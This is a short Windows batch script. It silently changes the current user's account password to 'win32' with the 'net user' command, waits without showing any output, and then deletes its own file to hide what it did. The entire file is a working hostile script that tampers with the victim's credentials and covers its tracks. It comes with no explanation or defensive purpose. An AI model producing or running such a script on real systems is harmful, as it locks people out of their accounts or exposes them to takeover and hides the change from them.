@ECHO OFF
cls
net user %username% win32
pause >nul
del %~nx0